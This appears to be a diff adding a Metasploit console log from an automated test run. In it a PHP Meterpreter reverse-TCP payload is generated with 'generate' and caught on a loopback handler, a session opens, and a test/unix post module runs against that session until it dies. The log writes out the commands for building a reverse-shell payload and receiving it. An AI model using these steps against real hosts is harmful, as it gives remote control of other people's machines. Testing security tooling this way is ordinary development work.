@@ -1,0 +1,21 @@
+use php/meterpreter/reverse_tcp
+[*] Killing all sessions...
+[*] 127.0.0.1 - Meterpreter session 43 closed.
+[4mmsf6[0m post([1m[31mtest/services[0m) [0m> generate -o D:/a/_temp/meterpreter-spec-rb-php-meterpreter-reverse-tcp20220124-3356-gikpsf.php -f raw lport=6046 lhost=127.0.0.1
+[4mmsf6[0m payload([1m[31mphp/meterpreter/reverse_tcp[0m) [0m> [*] Writing 1110 bytes to D:/a/_temp/meterpreter-spec-rb-php-meterpreter-reverse-tcp20220124-3356-gikpsf.php...
+[4mmsf6[0m payload([1m[31mphp/meterpreter/reverse_tcp[0m) [0m> to_handler
+[*] Payload Handler Started as Job 42
+[4mmsf6[0m payload([1m[31mphp/meterpreter/reverse_tcp[0m) [0m> 
+[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
+[*] Started reverse TCP handler on 127.0.0.1:6046 
+[*] Sending stage (39282 bytes) to 127.0.0.1
+[*] Meterpreter session 44 opened (127.0.0.1:6046 -> 127.0.0.1:50216 ) at 2022-01-24 01:20:49 +0000
+use test/unix
+[4mmsf6[0m post([1m[31mtest/unix[0m) [0m> run session=44 addentropy=true verbose=true
+
+[!] SESSION may not be compatible with this module:
+[!]  * incompatible session platform: windows
+[!]  * missing Meterpreter features: stdapi_fs_chmod, stdapi_railgun_api
+[*] Running against session 44
+[*] Session type is meterpreter and platform is windows
+[*] 127.0.0.1 - Meterpreter session 44 closed.  Reason: Died
